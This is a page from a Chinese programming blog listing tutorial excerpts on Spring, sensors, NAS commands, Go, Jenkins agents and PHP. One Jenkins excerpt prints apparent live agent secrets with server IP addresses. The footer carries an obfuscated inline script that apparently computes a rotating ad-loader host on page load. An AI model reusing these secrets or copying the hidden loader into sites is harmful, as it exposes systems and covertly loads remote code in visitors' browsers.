控制反转是依赖倒置原则的一种代码设计思路，就是把原先在代码里面需要实现的对象创建、对象之间的依赖，反转给容器来帮忙实现。 Spring IOC 容器通过 xml，注解等其他方式配置类与类之间的依赖关系，完成了对象的创建和依赖的管理注入，IOC 的主要设计模式是工厂模式
使用 IOC 可以实现累的快速配置以及便捷管理，降低了类与类之间的耦合度
AOP
AOP 的主要设计模式是动态代理，是面向切面编程的一种模式，切面实现了横切关注点的模块化，即将应用对象之间的横切点抽象为单独的模块
AOP 中的五种通知类型如下所示
通过 XML 配置文件声明切面
spring boot spring boot 是 spring 框架的扩展，去除了 spring 应用程序所需的 xml 配置
框架相关优点
内嵌 Tomcat、Jetty、UnderTow，而且不需要部署
提供了 stater 包简化了 maven 配置
尽可能全面的自动配置了相关 spring 配置
spring cloud spring cloud 是微服务架构的一种解决方案。集合了多个 spring 的优秀框架，提供了全套的分布式解决方案。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/99118db9baf0cd676d49ad2608e4b01a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eb1568325418a049db998357ae3a2579/" rel="bookmark">
			MQ系列传感器怎么用，mq2传感器引脚怎么接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于买的时候买错了，买成了传感器，而不是模块，到手是6根引脚的，
在网上找了半天资料，才找明白怎么接线，
所以个人使用还是建议直接买模块，省事，贵不了几元钱
但是还得讲一下传感器如何接线，
MQ系列传感器都是6个引脚，左边三根，右边三根
传感器都是基于电阻的，所以需要加热
同时，因为是基于电阻的，所以也没有正负之分，只要按照下边所说接线就可以。
在接线时，一边三个全部接Vcc 5V，其中中间一个是作为加热电压，其他两个只是作为回路电压；另一边中间接地，旁边两个都是输出。
输出只要用ADC转换采集就可以了，
至于stm32怎么写代码驱动，等我研究一下。过两天更新
听说该系列传感器灵敏度受温度影响较大，不好调试精准度？
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f27451297d25c4c2d29480daeb21531/" rel="bookmark">
			玩玩群辉NAS-常用命令行
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		玩玩群辉NAS-常用命令行 群辉中的系统命令或者套间命令大部分都是以syno开头的。
Syno 简单的 Node.js 包装器（包括浏览器）和用于 Synology DSM REST API 5.x 和 6.x 的 CLI(命令行界面)。阿
英文版：Synology Development Tool.
中文版：开发者工具
安装 只要安装模块
$ npm install syno 如果要将其另存为依赖项，只需添加该--save选项即可。
$ npm install syno --save 如果要使用CLI可执行文件进行安装，只需添加该--global选项。
$ npm install syno --global 配置 环境变量 在使用Syno前需要配置一些参数
$ export SYNO_ACCOUNT=user $ export SYNO_PASSWORD=password $ export SYNO_PROTOCOL=https # 笔者这边为http，如果设置为https会报ssl错误 $ export SYNO_HOST=localhost $ export SYNO_PORT=5001 配置文件 # Example config file, by default it should be located at: # ~/.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3f27451297d25c4c2d29480daeb21531/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef936d1ecde79a39a3de40840a77adb2/" rel="bookmark">
			python中如何产生随机数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在日常的生活工作和系统游戏等设计和制作时，经常会碰到产生随机数，用来解决问题，对此情况，向大家推几种可以产生随机数的方法。
1.首先需要导入random模块，使用import random导入。
random.random
random.random()用于生成一个0到1的随机符小数: 0 &lt;= n &lt; 1.0
2.首先需要导入random模块，使用import random导入。
random.uniform
random.uniform的函数原型为：random.uniform(a, b)，用于生成一个指定范围内的随机浮点数， 两个参数其中一个是上限，一个是下限。如果a &gt; b，则生成的随机数n: a &lt;= n &lt;= b。
3.首先需要导入random模块，使用import random导入。
random.randint
random.randint()的函数原型为：random.randint(a, b)，用于生成一个指定范围内的整数。其中参数a是下限，参数b是上限，生成的随机数n: a &lt;= n &lt;= b
4,首先需要导入random模块，使用import random导入。
random.randrange
random.randrange的函数原型为：random.randrange([start], stop[, step])，从指定范围内，按指定基数递增的集合中 获取一个随机数。如：random.randrange(10, 100, 2)，结果相当于从[10, 12, 14, 16, ... 96, 98]序列中获取一个随机数。random.randrange(10, 100, 2)在结果上与 random.choice(range(10, 100, 2) 等效。
对于上面四种方法，我们经常用到的是第二种，这种比较方便，如下图所示：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/363decb21914544a82135cbe35aedbe5/" rel="bookmark">
			保险业务知识—保险合同
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f09057a9cc6f7a127e2e43ce10319eb4/" rel="bookmark">
			DDD如何写出代码白话文
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://www.info.ucl.ac.be/~pvr/PrincipleOfLeastExpressiveness.pdf
前言 上面的链接就是本篇博客的主题，最小表达力原则。之前有看过很多代码设计相关的书籍，比如《重构》、《代码整洁之道》并且也切实遵循了这些规范，最近也亲身实践了DDD领域驱动设计，总是恍惚之间觉得这些个设计之间有一些共通性，但是也说不清楚到底是什么。阅读了上边这篇论文之后也没有通透的理解，不过感觉像是快要捅破了这层窗户纸了。
概念 The least expressive model means that if you can express your idea
with a constant, use that,and similarly for lookup tables, state machines, and so on. You should only use a Turing-complete language when you cannot
use something simpler—with the caveat not to contortthe code.
简单理解就是能用常量、表格、状态机等直观形式表现出来的逻辑，就不要用编程语言中各种特性来表现。
例子1 使用图灵完备的编程语言实现的解码器，每当阅读这部分代码的时候我们脑子里想的首先是按照编程语言解析这些if else，然后再理解不同文件与解码器的对应关系。如果再多一些解码器，你可能得拿出纸笔或者建一个Excel来理解不同文件类型与解码器之间的对应关系。后续对代码的修改可以轻松的在花括号之间加上任意“相关” 的逻辑，比如如果是GIF格式的文件，那么先检查下file大小再决定是否解码。加上这部分代码是非常容易的，而且也不需要过多思考的，如果你有个好的编程习惯，那么你会考虑检查file大小的代码放到这个分支下是否合适，但是你保不齐别人也有和你一样的习惯。抛异常这部分逻辑本就和文件-解码器对应关系 的逻辑没有关系，但是由if else这部分呢控制逻辑给混在了一起，没有分离关注点。 if (file.format() == JPG || file.format() == PNG) { return new DecoderA().decode(file); } else if (file.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f09057a9cc6f7a127e2e43ce10319eb4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd637a27ab89ec825b6c372760d75152/" rel="bookmark">
			Windows下IDEA启动项目报端口占用但是找不到占用进程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 IDEA启动项目报端口占用但是找不到占用进程 解决办法 第一步 使用netstat -aon|findstr "8080"命令在Windows CMD找占用进程，如果能找到就查找其对应的PID，再使用命令taskkill -f -pid xxxx杀死进程
或者直接考虑更换端口，若还是出现此问题或者找不到对应的占用进程就进入第二步
第二步 一般可考虑使用netsh winsock reset重置网络环境，然后重启PC
但是对于开启了hype-v虚拟化设置的windows系统，首先应考虑Hype-v保留部分端口用来做映射
因此可使用netsh interface ipv4 show excludedportrange protocol=tcp查看被实际保留的端口，部分截图如下：
很明显可以看出常用的8080，8081等等端口被保留，因此找一个不在此范围的端口使用即可或者如非必要可以关闭hype-v
补充方法 方法一、 关闭idea，然后杀死与JDK相关的所有进程，然后打开重试
方法二、 上面方法一不奏效后再次尝试杀死所有JDK相关进程，重启IDEA，添加以下依赖：
&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/634bd392389c048b3d808e67821077df/" rel="bookmark">
			dpdk 对 numa 的使用与多 numa 架构下性能调优的基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		numa 是什么？ 在 SMP 架构中，内存统一寻址（Uniform Memory Architecture)，处理器和内存之间通过一条总线连接起来。由于所有处理器都是通过一条总线连接起来的，随着处理器的增加，系统总线成为了系统瓶颈，另外，处理器和内存之间的通信延迟也较大。为了克服以上缺点，NUMA 架构应运而生。
numa 架构全称为非一致性内存架构 (Non Uniform Memory Architecture)，与 SMP 中的 UMA 统一寻址内存架构相对。在 numa 系统中有本地内存与远端内存的区别。访问本地内存有更小的延迟和更大的带宽，跨处理器内存访问速度会相对较慢一点，但是整个内存对于所有的处理器都是可见的。
numa 系统的一个示意图如下：
上图中有两个 cpu，CPU0 与 CPU1 都有自己的本地内存，访问这些内存的性能最优，这两个 cpu 也可以通过总线等架构跨处理器访问远端的内存，只不过性能相对会差一些。
如上信息与图片摘自《深入浅出 DPDK》。
dpdk-16.04 中对 numa 的使用 1. 如何获取 pci 网卡所在的 numa 节点？ linux 系统中 pci 设备会在 /sys/bus/pci/devices/ 中创建独立的子目录，目录名称就是 pci 设备的 pci 号。dpdk eal 初始化时，会扫描此目录来获取当前设备上所有可用的 pci 设备。每个 pci 设备所在的 numa 节点在 /sys/bus/pci/devices/xxx/numa_node 文件中保存，dpdk 通过访问这些文件获取到每个 pci 网卡的 numa_node 信息。
一个示例：
[root] # cat /sys/bus/pci/devices/0000\:80\:00.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/634bd392389c048b3d808e67821077df/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53bfefceadbaa4a900e621d21f8fa2ca/" rel="bookmark">
			golang超时控制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 日常开发中我们大概率会遇到超时控制的场景，比如一个批量耗时任务、网络请求等；一个良好的超时控制可以有效的避免一些问题（比如 goroutine 泄露、资源不释放等）。
Timer 在 go 中实现超时控制的方法非常简单，首先第一种方案是 Time.After(d Duration)：
func main() { fmt.Println(time.Now()) x := &lt;-time.After(3 * time.Second) fmt.Println(x) } output:
2021-10-27 23:06:04.304596 +0800 CST m=+0.000085653 2021-10-27 23:06:07.306311 +0800 CST m=+3.001711390 time.After() 会返回一个 Channel，该 Channel 会在延时 d 段时间后写入数据。
有了这个特性就可以实现一些异步控制超时的场景：
func main() { ch := make(chan struct{}, 1) go func() { fmt.Println("do something...") time.Sleep(4*time.Second) ch&lt;- struct{}{} }() select { case &lt;-ch: fmt.Println("done") case &lt;-time.After(3*time.Second): fmt.Println("timeout") } } 这里假设有一个 goroutine 在跑一个耗时任务，利用 select 有一个 channel 获取到数据便退出的特性，当 goroutine 没有在有限时间内完成任务时，主 goroutine 便会退出，也就达到了超时的目的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53bfefceadbaa4a900e621d21f8fa2ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/426c0cc6627fe9ef332729821aa61e3f/" rel="bookmark">
			探究 Xcode 命令行用法一：Xcode 构建必备认知
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本篇是 adat 项目的延伸文章，也是后续 Xcode 构建实操文章的铺垫，目的是让本系列的读者都有一个共同的认知，当读到某个章节时，不至于对某些概念产生疑惑。这些基础共识，如果你感觉有点模糊，请一定认真读完，如果已经具备，不妨再扫一眼，也许有惊喜哦。
内容概览 命令行用法文档命令行使用手册如何利用文档写一条命令Target、Configuration 和 Scheme 到底是什么东西？Project、Workspace 又是什么东西？xcodebuild 基础命令精彩预告 命令行用法文档 这里的 “用法” 取自英文的 “Usage”，是用法的简要形式。获取命令的 “用法文档” 取决于命令自身，因此没有固定的写法，工作经验告诉我们有下面几种常见写法（注意 &lt;命令&gt; 后有空格）：
&lt;命令&gt; -h&lt;命令&gt; help&lt;命令&gt; --help&lt;命令&gt; -usage 或者直接使用空命令尝试，如果命令出错，输出错误信息的同时一般会输出正确的用法。如果命令没有出错，表示该命令无需参数或使用了默认参数，可以通过阅读使用手册来获取。如果还是找不到，最后寻求官方网站的帮助。
示例，查看git命令的用法文档：
$ git --help 命令执行后，会将简要用法直接输出在当前界面：
$ git --help usage: git [--version] [--help] [-C &lt;path&gt;] [-c &lt;name&gt;=&lt;value&gt;] [--exec-path[=&lt;path&gt;]] [--html-path] [--man-path] [--info-path] [-p | --paginate | -P | --no-pager] [--no-replace-objects] [--bare] [--git-dir=&lt;path&gt;] [--work-tree=&lt;path&gt;] [--namespace=&lt;name&gt;] &lt;command&gt; [&lt;args&gt;] ... See 'git help git' for an overview of the system.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/426c0cc6627fe9ef332729821aa61e3f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ccfa4cbb96e00796c057bae89aefc093/" rel="bookmark">
			输入一行字符（输入以字符#结束），分别统计其中字母和数字字符的个数。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提示：判断一个字符是否为数字字符：c&gt;=’0’&amp;&amp;c&lt;=’9’
#include &lt;iostream&gt; using namespace std; int main() { cout &lt;&lt; "输入一行字符（输入以字符#结束）"; char zifu; int num=0, zimu=0,other=0; cin &gt;&gt; zifu; while (zifu != '#') { if (zifu &gt;='0'&amp;&amp; zifu &lt;= '9') num+=1; if (zifu &gt;='a'&amp;&amp; zifu &lt;='z'|| zifu &gt;='A'&amp;&amp; zifu &lt;='Z') zimu+=1; cin &gt;&gt; zifu; } cout &lt;&lt;"数字="&lt;&lt; num &lt;&lt; " " &lt;&lt;"字母="&lt;&lt; zimu; return 0; } 刚开始最困惑的一点在于：无论如何，while内的循环永远只会判断输入的“zifu”的第一个字符，然后后面的不检测了，输出的结果就永远是zimu=1或者是num=1。后来才知道char定义的zifu不等同于int、double之类的，char后面输多少个字符就有多少个字符，比如输入char 12ab3就是定义了五个字符，但int abc只定义了一个变量abc。于是想要依次检测“12ab3”中各个字符的类型就必须在每次检测完成之后推进一个字符，就要在循环末尾加上cin&gt;&gt;zifu，来保证循环能往下推进，否则真的只能检测第一个字符。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/851ce9c5870af30297b0b562a4c3c8fa/" rel="bookmark">
			如何构造哈夫曼树？借助口诀&#43;两个特点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		贪心算法：先挑小的叶子来构造，大的留到最后就能离根近一些
哈夫曼算法的步骤：根据n个给定的权值，构造有n个树的森林，n个树都只有1个根结点，其权值给定（森林中有几个树？给了几个权值就几个树，每个树都只有1个结点）
重复2，3步骤
直到只剩下一棵树结束
口诀：
例子：
1.构造森林全是根：一开始就用4个结点构造了4棵二叉树，构成一个森林（有几个叶子结点就有几棵树）
2.选用两小造新树：选2，4为他们两个增加一个双亲结点作为根，这个新树的根结点的权值是两个根结点权值的和，2+4=6
3.删除两小添新人：现在变成3棵树了，选5，6造一个新树，添加一个根结点，权值5+6=11
4.重复2，3剩单根：
错解：
我做错了
观察：
4个叶子结点构造新树，新树的根结点都是度为2的，它必有左右子树，因为我们选用了两小，一个做左子树，一个做右子树，所以新添加的结点都是度为2的，我们一开始的结点都是度为0的
包含n个叶子结点总共有多少个结点？2n-1
两两合并产生一个新的结点，如果有n个，一定会合并n-1次，最后才剩下一棵树，这n-1次合并就会产生n-1个结点，这n-1个结点都是度为2的结点，而度为0的结点是n个
再看一个例子：
总结：
1.
2.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a3ab7a0f98ecaf338b770307bbcc124/" rel="bookmark">
			PCL存储点云错误pcl::IOException what() [pcl::PCDWriter::writeASCII] Could not open file for writing
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于PCL写入/读取点云的报错：
写入：
1 点云指针为空。
最好在写入前面加一个判断，只有当指针不为空时才执行写入到点云的操作，即：
if (!cloud-&gt;points.empty()) { pcl::PCDWriter writer; writer.write&lt;pcl::PointXYZ&gt; ("cloud.pcd", *cloud, false); } 2 文件路径不存在。
一般保存时写的相对路径，是相对于可执行文件的位置而言的。即如果直接保存，则文件存放在和可执行文件相同的位置，如果你写的保存路径下有子文件夹，则会在可执行文件的位置搜索这个文件夹，如果有，则保存；如果没有，则报错。（有时候好像不会报错，也没有这个文件。）
这样一来，最好在程序开头检查一下有没有这个文件夹，如果没有，则创建之。
DIR *dir; if ((dir = opendir("/home/aemc/catkin_ws/devel/lib/rvv/out/")) == NULL) { system("mkdir -p /home/aemc/catkin_ws/devel/lib/rvv/out/"); //system( s.c_str() ); } 上述代码我在ubuntu下编译没有错，如果是windows系统，需要加一个函数来把你写的路径转换成字符串。
DIR *dir; if ((dir = opendir("/home/aemc/catkin_ws/devel/lib/rvv/out/".c_str())) == NULL) { system("mkdir -p /home/aemc/catkin_ws/devel/lib/rvv/out/"); } 3 没有写入权限。
不妨在开头先试一下能不能写入文件。
FILE* tempFile = fopen("test.txt", "w+"); if (tempFile == nullptr) { cout &lt;&lt; "没有写入权限！"&lt;&lt; endl; return -1; } fclose(tempFile); remove("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a3ab7a0f98ecaf338b770307bbcc124/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61c0a4f643e3d3ce63c382dde61b23d5/" rel="bookmark">
			Windows配置Anaconda环境变量
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 安装Anaconda后，如果环境变量配置不当，python没法正常使用，要不找不到python路径，要不import报错，将下面三个路径配置到系统变量path中，python就能正常还行了。
C:\ProgramData\Anaconda3 C:\ProgramData\Anaconda3\Scripts C:\ProgramData\Anaconda3\Library\bin 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2acf689f0638e5047d124f0d0579ca0c/" rel="bookmark">
			Jenkins Docker静态agent节点的构建
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		静态节点就是固定的在一台机器上面，通过一些固定的命令将其启动起来，动态节点就是来了多个任务，可以帮你创建多个agent去跑。而不像静态节点来了多个任务，那么就会等待这个任务队列，然后进行这个构建。这就是静态和动态的区别。
静态节点就是通过java -jar这条命令去启动起来就可以了。
1. 静态节点实践 首先，在Jenkins 中创建一个jnlp类型的agent， 拿到连接所需要的认证和秘钥信息。
jar -jar这条命令后面有很多的参数，不管是配置动态节点还是静态节点，这些参数都会用到。 java -jar agent.jar -jnlpUrl http://192.168.1.200:8080/computer/buildtest01/jenkins-agent.jnlp -secret 047a2627be5ee128c1a93f281051acc7bbbbd5221dcb56ae9fa408a494e72c2f -workDir "/home/jenkins" 1.1 Docker静态节点
启动镜像，传递认证参数。(使用docker的话其实就是使用一个镜像，镜像里面运行了一个agent，然后将这些参数传递进去)
在虚拟机上面下载agent.jar包然后手动执行这些命令就可以了 在命令行中启动节点 java -jar agent.jar -jnlpUrl http://139.198.166.235:8080/computer/build%2D02/jenkins-agent.jnlp -secret 942d7e769a43f65388751ee954af20e90fa0c5f8bdb19e0584db4cc61adab8ba -workDir "/var/jenkins" Run from agent command line, with the secret stored in a file: echo 942d7e769a43f65388751ee954af20e90fa0c5f8bdb19e0584db4cc61adab8ba &gt; secret-file java -jar agent.jar -jnlpUrl http://139.198.166.235:8080/computer/build%2D02/jenkins-agent.jnlp -secret @secret-file -workDir "/var/jenkins" 如果是在docker里面就需要找一个agent镜像：inbound-agent镜像 : Docker Hub
## 测试 [root@jenkins-agent ~]# docker run --init jenkins/inbound-agent -url http://139.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2acf689f0638e5047d124f0d0579ca0c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b925b583dfdc7bc96e15d1aff1db67d5/" rel="bookmark">
			深度学习领域的论文该怎么写？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		深度学习领域的论文有很多，今天给大家分享一个好用的网站AMiner，在主页我的订阅那里输入deep learning，系统就会自己推荐最新的优质论文，而且论文都是可以免费下载的，希望大家可以通过这个网站找到心目中最惊艳的论文~
AMiner平台链接: https://www.aminer.cn/?f=cs
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd0751a1875f49bbb780ca64f1e51060/" rel="bookmark">
			Ps 2022 版新增功能及改进
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ps 2022 版，即 Photoshop 2021 年 10 月版（版本 23.0） 。
Ps 2022 版对电脑硬件有更高的要求，包括更新的显卡、更大的内存等，电脑配置较低的用户谨慎升级。
Camera Raw 滤镜 的升级
Camera Raw 滤镜升级到版本 14。
Camera Raw 14 主要增加了强大的蒙版功能，
包括基于人工智能技术的选择主体和选择天空功能，自动创建蒙版。
既可以在一个蒙版中添加多个区域或减去不需要的区域，亦可以创建多个蒙版。
对象选择工具的更新
当使用对象选择工具时，将鼠标悬停在图像上并单击时，系统可自动选取图像的某一部分。
加按 Ctrl （Win）/Shift（macOS）键可继续选择。 取消勾选工具选项栏上的“对象查找程序” Object Finder选项，即恢复至手动选择。 新式油画滤镜
Ps菜单：滤镜/风格化/油画
Filter/Stylize/Oil Paint
新的基于 GPU 的油画滤镜，不再依赖于计算机上的 OpenCL 子系统。
要获得更佳性能，请在“首选项/性能"中启用“使用图形处理器”。
改进的渐变工具
借助新的插值选项，渐变现在看起来比以往更清晰、更明亮、更出色。
方法 Method
--可感知 Percetural
--线性 Linear
--经典 Classic
选择主体云服务
提供比当前选择主体更高质量的结果。
改进的“导出为...”
Ps菜单：文件/导出/导出为...
File/Export/Export As...
“导出为”的速度比以往更快。
可以输出动画 GIF，并与原始文件并排进行比较。
共享以供注释功能
Ps菜单：窗口/注释
Window/Comments
解决 - 解决并响应注释
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cd0751a1875f49bbb780ca64f1e51060/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d739657318267a44567b239586e9d3a8/" rel="bookmark">
			php 解析excel 表格的数据方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、获取本地某个excel 的数据，如表格
2、做成动态的数据，如按照一定的表格样式构建数据，然后上传，获取文件地址，开始解析excel,获取数据
以上两个方法都可以用如下方法，便可以解析出excel 里面的数据
public function handle_data(){ /*读取excel文件，并进行相应处理*/ //s$fileName = "F:/handle_data/data.xlsx"; 这是第一个方法，直接获取文件excel的地址 //$fileName = "F:/handle_data/test.xlsx"; error_reporting(E_ALL); ini_set('display_errors', TRUE); ini_set('display_startup_errors', TRUE); $info = array('status' =&gt; 'fail', 'msg' =&gt; '上传失败!'); $file = $_FILES['upfile'];这是第二个方法，上传本地文件excel,到下面去获取excel地址 if ($file['error'] == 4) { $info['msg'] = '请选择文件后再上传！'; } else if ($file['error'] == 1) { $info['msg'] = '文件超出了php.ini文件指定大小！'; } else if ($file['size'] &gt; 0) { $key = md5_file($file['tmp_name']); $upfile_path = Tiny::getPath("uploads") . '/excel/'; $upfile_url = preg_replace("|^" . APP_URL .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d739657318267a44567b239586e9d3a8/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/172/">«</a>
	<span class="pagination__item pagination__item--current">173/306</span>
	<a class="pagination__item pagination__item--next btn" href="/page/174/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y